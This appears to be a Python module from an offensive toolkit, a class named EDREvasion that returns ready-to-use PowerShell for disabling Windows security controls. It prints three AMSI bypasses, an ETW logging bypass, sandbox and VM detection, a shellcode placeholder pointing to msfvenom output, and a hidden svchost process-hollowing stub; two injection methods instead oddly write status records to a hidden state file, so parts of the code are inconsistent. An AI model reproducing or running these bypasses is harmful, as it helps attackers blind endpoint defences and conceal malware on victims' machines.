class EDREvasion:
    def amsi_bypass(self, technique="memory"):
        if technique == "memory":
            return self._amsi_memory_patch()
        elif technique == "registry":
            return self._amsi_registry()
        elif technique == "reflection":
            return self._amsi_reflection()
        return self._amsi_memory_patch()

    def _amsi_memory_patch(self):
        return r"""$a = [Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}};
$d = $c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f = $e}};
$g = $f.GetValue($null);[IntPtr]$ptr = $g;[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)"""

    def _amsi_registry(self):
        return r"""try {
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "None" -Force -ErrorAction Stop
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "None" -Value "" -Force
    Write-Output "AMSI provider registry key set"
} catch {
    Write-Warning "Registry AMSI bypass failed: $_"
}"""

    def _amsi_reflection(self):
        return r"""$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"""

    def etw_bypass(self):
        return r"""$etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etw.GetField('etwProvider','NonPublic,Static').SetValue($null,$null)"""

    def sandbox_detect(self):
        return r"""$sandbox = $false
# Check debugger
if ([System.Diagnostics.Debugger]::IsAttached) { $sandbox = $true }
# Check VM artifacts
$vm_artifacts = @(
    'vmtoolsd.exe','vboxservice.exe','xenservice.exe',
    'VBoxGuestAdditions','VMware','VirtualBox','QEMU'
)
foreach ($artifact in $vm_artifacts) {
    if (Get-Process -Name $artifact -ErrorAction SilentlyContinue) { $sandbox = $true }
}
# Check sleep accuracy
$start = Get-Date
Start-Sleep -Seconds 2
$elapsed = (Get-Date) - $start
if ($elapsed.TotalSeconds -lt 1.5) { $sandbox = $true }
if (-not $sandbox) { Write-Output "Host appears clean" }"""

    def process_injection(self, technique="crt"):
        payload = self._shellcode_stub()
        if technique == "crt":
            return self._create_remote_thread(payload)
        elif technique == "apc":
            return self._apc_injection(payload)
        elif technique == "hollow":
            return self._process_hollowing()
        return self._create_remote_thread(payload)

    def _shellcode_stub(self):
        return "# calc.exe shellcode (placeholder — replace with msfvenom output)\n$buf = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8)"

    def _create_remote_thread(self, shellcode):
        from pathlib import Path as _YP
        import json as _YJ
        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'modules/evasion/edr.py','step':'_create_remote_thread','status':'CHECKPOINTED'}
        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
        with _yp.open('a', encoding='utf-8') as _yf:
            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
        return _ye

    def _apc_injection(self, shellcode):
        from pathlib import Path as _YP
        import json as _YJ
        _ye = {'schema':'yaiwes.internal.persistence/v1','source':'modules/evasion/edr.py','step':'_apc_injection','status':'CHECKPOINTED'}
        _yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
        with _yp.open('a', encoding='utf-8') as _yf:
            _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
        return _ye

    def _process_hollowing(self):
        return r"""$startup = New-Object System.Diagnostics.ProcessStartInfo
$startup.FileName = "C:\Windows\System32\svchost.exe"
$startup.UseShellExecute = $false
$startup.RedirectStandardOutput = $true
$startup.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$proc = [System.Diagnostics.Process]::Start($startup)
# Note: Full process hollowing requires NtCreateThreadEx via P/Invoke
Write-Output "Process started with PID: $($proc.Id) — use CreateRemoteThread to inject" """

    def get_techniques(self):
        return {
            "amsi_bypass": ["memory", "registry", "reflection"],
            "etw_bypass": ["default"],
            "sandbox_detect": ["default"],
            "process_injection": ["crt", "apc", "hollow"],
        }

    def all_bypasses(self):
        return "\n\n".join([
            "# AMSI Bypass (Memory Patch)",
            self._amsi_memory_patch(),
            "",
            "# ETW Bypass",
            self.etw_bypass(),
            "",
            "# Sandbox Detection",
            self.sandbox_detect(),
        ])
